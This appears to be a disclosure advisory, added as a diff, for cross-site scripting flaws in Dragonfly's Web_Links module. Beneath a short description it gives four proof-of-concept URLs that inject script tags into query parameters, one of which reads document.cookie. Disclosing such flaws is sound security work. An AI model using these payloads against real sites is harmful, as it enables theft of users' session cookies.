@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/16784/info
+   
+Dragonfly is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input. 
+   
+An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+http://www.example.com/index.php?name=Web_Links&l_op=viewlink&cid=15&min=10&orderby=title%20ASC&show=0"><script>alert(document.cookie)</script>
+http://www.example.com/index.php?name=Web_Links&l_op=viewlink&cid=15"><script>alert()</script>
+http://www.example.com/index.php?name=Web_Links&l_op=toprated&ratenum=5&ratetype=percent"><script>alert()</script>
+http://www.example.com/index.php?name=Web_Links&l_op=viewlink&cid=15&orderby=titled"><script>alert()</script>
